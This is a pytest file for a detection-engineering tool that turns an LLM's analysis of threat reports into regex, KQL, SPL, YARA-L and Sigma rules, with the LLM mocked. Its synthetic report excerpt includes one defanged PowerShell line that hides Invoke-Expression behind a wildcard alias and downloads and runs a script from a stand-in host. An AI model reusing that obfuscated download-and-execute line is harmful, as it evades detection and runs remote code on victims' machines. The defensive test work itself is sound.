"""End-to-end test: detect.find_obfuscation -> generate.generate_rules, run
against a synthetic report excerpt through a MockLLMProvider, matching the
`ingest -> detect -> generate -> render` integration contract in
`_briefs/00-ARCHITECTURE.md` (minus the ingest/render steps, which are other
builders' modules).
"""

from __future__ import annotations

from globwarden.engine.detect import find_obfuscation
from globwarden.engine.generate import generate_rules
from globwarden.models import IngestedContent, ObfuscationCategory, RuleType, SourceType

from .conftest import (
    VALID_KQL_QUERY,
    VALID_REGEX_PATTERN,
    VALID_SIGMA_RULE,
    VALID_SPL_QUERY,
    VALID_YARA_L_RULE,
    detection_response_json,
    kql_response_json,
    regex_response_json,
    sigma_response_json,
    spl_response_json,
    wildcard_finding_dict,
    yara_l_response_json,
)

# A short, synthetic threat-intel-style report excerpt describing the wildcard
# IEX resolution pattern in prose, with one worked example — the shape of
# content this tool's primary path is built to consume. Synthetic, defanged
# per project convention (no live infrastructure).
SAMPLE_REPORT_EXCERPT = """\
Incident Notes — Suspicious PowerShell Activity (synthetic sample)

During triage of an endpoint alert, analysts identified a PowerShell script
block that avoided naming Invoke-Expression directly. Instead, the script
used Get-Alias with a wildcard pattern to resolve the built-in "iex" alias at
runtime, then invoked the resolved command object via the call operator. The
literal strings "Invoke-Expression" and "iex" never appear anywhere in the
script text, which defeated the organization's existing command-line
signature.

Observed pattern (defanged):
    &(Get-Alias i*x) (New-Object Net.WebClient).DownloadString('hxxp://pkg-update-cdn[.]test/stage.ps1')

This is consistent with MITRE ATT&CK T1027.010 (Command Obfuscation), a
sub-technique of T1027 covering command-line and script-text obfuscation via
aliases, wildcards, and similar evasion primitives.
"""


def test_full_pipeline_produces_sensible_findings_and_rules(mock_provider_factory):
    # Detection call returns one realistic wildcard-resolution finding.
    detection_response = detection_response_json([wildcard_finding_dict("f1")])

    # Generation calls: one finding x five rule types, in the order generate_rules
    # iterates (rule_types order, for each finding).
    generation_responses = [
        regex_response_json(VALID_REGEX_PATTERN),
        kql_response_json(VALID_KQL_QUERY),
        spl_response_json(VALID_SPL_QUERY),
        yara_l_response_json(VALID_YARA_L_RULE),
        sigma_response_json(VALID_SIGMA_RULE),
    ]

    provider = mock_provider_factory(responses=[detection_response, *generation_responses])

    content = IngestedContent(
        source="synthetic-incident-notes.txt",
        source_type=SourceType.TEXT,
        text=SAMPLE_REPORT_EXCERPT,
    )

    findings = find_obfuscation(content, provider)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.id == "f1"
    assert finding.category == ObfuscationCategory.WILDCARD_RESOLUTION
    assert "Get-Alias" in finding.example_snippet or "iex" in finding.example_snippet.lower()
    assert finding.attack_mapping.startswith("T1027.010")
    assert 0.0 <= finding.confidence <= 1.0

    all_rule_types = [RuleType.REGEX, RuleType.KQL, RuleType.SPL, RuleType.YARA_L, RuleType.SIGMA]
    rules = generate_rules(findings, all_rule_types, provider)

    assert len(rules) == 5
    assert {r.rule_type for r in rules} == set(all_rule_types)
    assert all(r.finding_id == "f1" for r in rules)
    assert all(r.content.strip() for r in rules)  # every rule has real content
    assert all(r.explanation.strip() for r in rules)  # every rule has an explanation
    assert all(r.valid is True for r in rules), [(r.rule_type, r.validation_note) for r in rules if not r.valid]

    # Spot-check format-specific shape.
    regex_rule = next(r for r in rules if r.rule_type == RuleType.REGEX)
    import re

    re.compile(regex_rule.content)

    sigma_rule = next(r for r in rules if r.rule_type == RuleType.SIGMA)
    import yaml

    parsed_sigma = yaml.safe_load(sigma_rule.content)
    assert "detection" in parsed_sigma and "condition" in parsed_sigma["detection"]


def test_pipeline_with_no_findings_generates_no_rules(mock_provider_factory):
    provider = mock_provider_factory(responses=[detection_response_json([])])
    content = IngestedContent(source="benign.txt", source_type=SourceType.TEXT, text="Nothing obfuscation-related here.")

    findings = find_obfuscation(content, provider)
    assert findings == []

    rules = generate_rules(findings, [RuleType.REGEX, RuleType.SIGMA], provider)
    assert rules == []
    # No generation calls should have been made at all — provider was only
    # called once, for the (empty-result) detection pass.
    assert provider.call_count == 1
